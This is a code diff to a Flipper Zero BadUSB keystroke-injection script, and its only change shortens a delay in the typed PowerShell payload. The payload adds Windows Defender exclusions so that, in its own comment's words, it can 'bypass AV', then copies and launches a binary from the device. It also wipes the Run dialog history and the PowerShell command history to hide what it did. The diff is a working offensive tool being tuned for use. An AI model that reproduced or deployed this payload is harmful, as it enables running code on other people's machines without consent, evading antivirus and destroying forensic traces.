@@ -31,7 +31,7 @@ delay(2000);
 badusb.press("ALT", "y");
 delay(2000);
 print("Running payload"); // Detect the Flipper, set the DriveLetter, set the Flipper's drive as an excluded drive from Windows Defender to bypass AV, Run the given Binary, clean up after and remove command history
-badusb.println("Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd " + localTempFolder + ";Add-MpPreference -ExclusionPath " + localTempFolder + ";Copy-Item -Path $Bin_Path;Start-Process " + binary + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
+badusb.println("Start-Sleep 2;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd " + localTempFolder + ";Add-MpPreference -ExclusionPath " + localTempFolder + ";Copy-Item -Path $Bin_Path;Start-Process " + binary + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
 badusb.press("ENTER");
 badusb.quit();
 delay(2000);
